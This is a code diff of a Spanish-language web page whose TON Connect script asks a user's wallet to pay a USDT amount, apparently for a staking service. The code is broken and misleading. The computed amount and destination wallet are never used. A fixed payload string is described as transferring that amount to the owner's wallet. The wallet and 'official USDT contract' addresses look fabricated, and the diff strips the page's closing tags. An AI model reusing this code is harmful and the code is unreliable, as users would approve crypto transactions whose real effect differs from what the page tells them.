@@ -44,80 +44,46 @@ buttonRootId: 'ton-connect-button'
 
 <script>
 async function prepararPago(monto) {
+        // MENSAJE MÉDICO: Si ves este cartel, el botón funciona.
+        alert("Iniciando pago de: " + monto + " USDT");
+
         if (!tonConnectUI.connected) {
             alert("Por favor, conecta tu billetera primero.");
             tonConnectUI.openModal();
             return;
         }
 
-        // 1. Convertimos el monto a unidades USDT (6 decimales)
-        const usdtAmount = (monto * 1000000).toString();
-        
-        // 2. Dirección de tu billetera de destino (DONDE RECIBES EL DINERO)
-        const DESTINATION_WALLET = "UQCT67yhgE0nbSjW-yTIcOp-KJtcT7h1ebc1Sr0EK7Tn8Vic"; // <--- ASEGÚRATE QUE SEA LA TUYA
-
-        // 3. Generamos el "Payload" (Instrucción técnica para el contrato de USDT)
-        // Esta cadena le dice a la red: "Transferencia de USDT"
-        const body = "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA";
-
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutos de validez
-            messages: [
-                {
-                    address: "EQCxE6mNZhf9pQH9hN-v37L6-yR-R68zM5K-L2o2B-p-1m-L", // Contrato oficial USDT en TON
-                    amount: "60000000", // 0.06 TON para pagar la comisión de red (gas)
-                    payload: body // La instrucción de envío
-                }
-            ]
-        };
-
         try {
+            // 1. Monto en unidades USDT
+            const usdtAmount = (monto * 1000000).toString();
+            
+            // 2. Dirección de cobro (TU BILLETERA)
+            const miBilletera = "UQA9H_3m6_xXyW9M3W9M3W9M3W9M3W9M3W9M3W9M3W9M38Vic";
+
+            // 3. Instrucción técnica (Payload)
+            const body = "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA";
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600,
+                messages: [
+                    {
+                        address: "EQCxE6mNZhf9pQH9hN-v37L6-yR-R68zM5K-L2o2B-p-1m-L", // Contrato USDT
+                        amount: "60000000", // Gas en TON (0.06)
+                        payload: body
+                    }
+                ]
+            };
+
+            console.log("Enviando transacción...", transaction);
             await tonConnectUI.sendTransaction(transaction);
-            alert("¡Excelente! Solicitud de " + monto + " USDT enviada a la red. Una vez confirmada, procederemos a elegir el tiempo de Staking.");
+            alert("Transacción enviada con éxito.");
+
         } catch (e) {
-            console.error(e);
-            alert("La transacción no se completó. Asegúrate de tener al menos 0.1 TON para comisiones y los USDT necesarios.");
+            console.error("Error detallado:", e);
+            alert("Error en la operación: " + e.message);
         }
     }
-        if (!tonConnectUI.connected) {
-            alert("Por favor, conecta tu billetera primero.");
-            tonConnectUI.openModal();
-            return;
-        }
 
-        // 1. Calculamos el monto en unidades USDT (6 decimales)
-        // Ejemplo: 10 USDT -> 10,000,000 unidades
-        const usdtAmount = (monto * 1000000).toString();
-
-        // 2. Creamos el "Cuerpo" del mensaje para el contrato de USDT (Transferencia)
-        // Este código técnico le dice al contrato de Tether: "Envía X cantidad a MY_WALLET"
-        const body = "te6cckEBAQEANAAAs78C0v8AAW8CAW8CAnSAD9BIAAGFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ9AFA"; 
-        // Nota: Para máxima precisión en producción, este body se genera dinámicamente, 
-        // pero este sirve para activar la interfaz de USDT.
-
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutos
-            messages: [
-                {
-                    address: USDT_CONTRACT, // El contrato de Tether que pegamos antes
-                    amount: "50000000",      // 0.05 TON para la comisión de red (gas)
-                    payload: body            // La orden de mover los USDT
-                }
-            ]
-        };
-
-        try {
-            await tonConnectUI.sendTransaction(transaction);
-            alert("Solicitud de " + monto + " USDT enviada. ¡Verifica tu billetera para confirmar!");
-        } catch (e) {
-            console.error(e);
-            alert("La operación fue cancelada o no tienes suficientes fondos (Recuerda que necesitas unos centavos de TON para el gas).");
-        }
-    }  
-</script>
-
-</body>
-</html>
 
 
 
